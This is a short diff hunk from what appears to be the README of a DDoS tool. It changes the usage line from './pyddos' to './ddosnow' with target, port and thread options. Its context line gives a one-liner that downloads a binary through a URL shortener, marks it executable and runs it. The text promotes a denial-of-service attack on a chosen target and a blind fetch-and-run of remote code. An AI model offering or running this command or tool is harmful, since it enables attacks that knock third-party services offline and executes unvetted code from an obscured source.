@@ -4,7 +4,7 @@
 
 ### wget is.gd/ddosnow && chmod +x ddosnow && ./ddosnow
 
-## usage: ./pyddos -t [target] -p [port] -t [number threads] 
+## usage: ./ddosnow -t [target] -p [port] -t [number threads] 
 optional arguments: -h, --help show this help message and 
 exit -v, --version show program's version number and exit 
 options: -d <ip|domain> Specify your target such an ip or 
